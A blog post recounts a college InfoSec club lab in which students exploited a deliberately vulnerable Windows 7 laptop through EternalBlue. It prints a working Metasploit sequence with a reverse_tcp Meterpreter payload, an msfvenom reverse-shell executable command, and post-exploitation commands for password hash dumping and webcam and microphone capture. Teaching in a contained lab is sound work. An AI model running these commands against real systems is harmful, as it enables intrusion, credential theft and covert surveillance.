---
title: 🔐 BC InfoSec — Eternal Blue Demo
pubDate: "2025-06-08"
description: "Hands-on EternalBlue exploit demo on Windows 7."
category: general
image: "/images/eternalblue/cover.png"
alt: "Funky image of a cat"
tags: 
    - cve-2017-0144
    - eternalblue
    - windows-7
    - vulnerability-demo
---

### Preface

In April of 2025 I conducted a lab for members of the InfoSec Club at Bellevue College to attack a real laptop running an outdated and vulnerable version of Windows 7, specifically targeting the exploit EternalBlue.

Here are the behind the scenes details as to how I carried out the lab and the pitfalls I fell in along the way.

---

{{< Image src="/images/eternalblue/laptop.png" alt="The laptop that I eventually ended up using." width="600" height="400" >}}

The laptop that I eventually ended up using.

### Why Windows 7?

I chose Windows 7 because the EternalBlue exploit is easy to execute on real hardware and the vulnerable components are still accessible online. It’s also a memorable exploit from TryHackMe, and it's tied to the infamous WannaCry ransomware, making it perfect for showing students real-world implications.

{{< Image src="/images/eternalblue/iso.png" alt="One of the Windows 7 ISOs I found." width="600" height="400" >}}

One of the Windows 7 ISOs I found.

## USB 3.0 Installation Issues and Workarounds

My first attempt was on a Sony VAIO laptop with only USB 3.0 ports. Unfortunately, genuine Windows 7 SP1 ISOs don’t include USB 3.0 drivers, so installation couldn’t proceed. I could’ve burned the ISO to a CD-ROM, but instead I switched to a ThinkPad with USB 2.0 ports.

While digging around archive.org, I came across a Japanese ISO and a modified 32-bit version that supported USB 3.0, but EternalBlue is more stable on 64-bit versions, so I avoided those.

## Finding Safe Installation Media

I sourced my ISOs from [massgrave.dev](https://massgrave.dev/), which appeared to provide clean Windows 7 images. While I didn’t rigorously verify them, the lack of bundled activation scripts or extra drivers lent legitimacy. These weren't used for sensitive data, so the risk was acceptable for a contained lab setup.

{{< Image src="/images/eternalblue/motd.png" alt="MOTD of the Kali VM" width="600" height="400" >}}

MOTD of the Kali VM

## Kali Linux Setup for Students

I spun up one Kali VM on my Proxmox node with a limited "student" account. I restricted `sudo` access to just `nmap` and `metasploit` commands and added a custom ASCII art login banner by editing `/etc/motd`. I relied on students following the rules of engagement, trusting they wouldn't attack the Proxmox node or each other.

{{< Image src="/images/eternalblue/desktop.png" alt="Desktop of the vulnerable Windows 7 SP1 laptop." width="600" height="400" >}}

Desktop of the vulnerable Windows 7 SP1 laptop.

## Making Windows 7 Vulnerable

To ensure the exploit worked, I:

- Disabled Windows Firewall, Updates, and Defender.
- Created a persona named "Bobby Tables" with files, themes, and desktop widgets to make the machine look lived-in.

<!-- ![Image taken using meterpreter from the vulnerable laptop.](image%204.png) -->

{{< Image src="/images/eternalblue/meterpreterpic.png" alt="Image taken using meterpreter from the vulnerable laptop." width="600" height="400" >}}

Image taken using meterpreter from the vulnerable laptop.

## Exploiting with Metasploit and Meterpreter

The demo sequence:

```bash
nmap --top-ports 50 10.10.10.50
nmap -p 445 --open --script=smb-os-discovery 10.10.10.50
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.50
run
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.10.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.75
exploit
```

Once inside Meterpreter:

```bash
sysinfo
ipconfig
hashdump
ps
migrate [PID]
```

Fun commands:

- `webcam_stream`, `screenshare`, `record_mic`
- TTS: `execute -f powershell.exe -a "Add-Type...Speak('You have been hacked')"`
- Fake alerts: `execute -f mshta.exe -a "vbscript:msgbox(...)"`
- Open websites: `execute -f cmd.exe -a "/c start https://google.com"`

### Notes I prepared for the meeting:

[Notes for EternalBlue Demo](https://www.notion.so/Notes-for-EternalBlue-Demo-2071a2360ee380d3b52dcffbc877d5f3?pvs=21)

## Reverse Shell Access for Students

I used `msfvenom` to generate payloads with unique ports:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.75 LPORT=XXXX -f exe -o studentXXXX.exe
```

Students opened listeners using:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT XXXX
exploit -j
```

On the host, I executed the EXE manually. Once in students had to use `migrate PID` into the `explorer.exe` process to interact with the desktop environment.

## Travel Router Networking

I wired the Kali box and Windows 7 laptop to a travel router, which repeated school Wi-Fi and provided a private LAN. I used DHCP reservations to assign fixed IPs for the Kali VM and Windows machine, keeping command prep simple and avoiding IP conflicts.

## Teaching Aids

I created a slide deck that explained EternalBlue, the history of WannaCry, and basic steps for identifying and exploiting the vulnerability. I emphasized the dangers of RCE bugs and kept demo commands prepped for copy-pasting.

## What I’d Improve Next Time

- **Prep payloads**: Pre-generate `.exe` backdoors to save time.
- **Tighter environment control**: A student got RDP access and bypassed the setup.
- **More coverage**: I wanted to demo hash stealing and password cracking but ran into issues with `migrate` and process permissions.
- **EternalBlue quirk**: It works once per boot — if you mess up the first attempt, you'll need a reboot.

---

### Slides:

[EternalBlue Demo InfoSecClub.pdf](/public/files/EternalBlue_Demo_InfoSecClub.pdf)

### Recording:

[https://www.youtube.com/watch?v=9wS6HYpg0S0](https://www.youtube.com/watch?v=9wS6HYpg0S0)